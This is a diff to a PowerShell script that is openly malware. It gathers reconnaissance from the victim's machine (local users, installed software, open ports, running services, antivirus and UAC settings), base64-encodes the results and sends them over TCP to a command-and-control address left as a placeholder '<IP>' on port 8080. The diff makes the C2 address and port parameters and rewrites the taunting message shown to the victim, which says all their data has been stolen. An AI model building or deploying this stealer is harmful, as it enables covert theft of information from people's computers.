@@ -324,7 +324,9 @@ function SendDataToC2 {
     [CmdletBinding()]
     param (
         [Parameter()]
-        [string[]]$data
+        [string[]]$data,
+        [string]$ip,
+        [int]$port
     )
 
     try {
@@ -334,7 +336,7 @@ function SendDataToC2 {
         $encoded = $joined -replace '\+','%2B' -replace '/','%2F' -replace '=','%3D'
 
         $client = New-Object System.Net.Sockets.TcpClient
-        $connectTask = $client.ConnectAsync("<IP>", 8080)
+        $connectTask = $client.ConnectAsync($ip, $port)
 
         if (-not $connectTask.Wait(1000)) {
             $client.Dispose()
@@ -357,7 +359,7 @@ function SendDataToC2 {
 
 # call for storing the information from function
 $info = @()
-$info = BasicReconInformation
+$info += BasicReconInformation
 $info += LocalUsers
 $info += InstalledSoftware
 $info += OpenPorts
@@ -369,9 +371,9 @@ $info += RunningServices
 $info += AntivirusInfo
 $info += UACPolicy
 
-
+# sending the data
 $newinfo = ConvertToBase64 -data $info
+SendDataToC2 -data $newinfo -ip "<IP>" -port 8080 # change this 
 
-SendDataToC2 -data $newinfo
-# this is for debug
-ShowAllInformation -info "WOOPS!!!!!!!!`nYour PC have been PWN'ed..... :(`n`nSORRY!!!"
+# comment this if you dont want a message for the victim
+ShowAllInformation -info "WOOPS!!!!!!!!`nYour PC have been PWN'ed and all the data on your system has been stolen....... :(`n`nSORRY!!!"
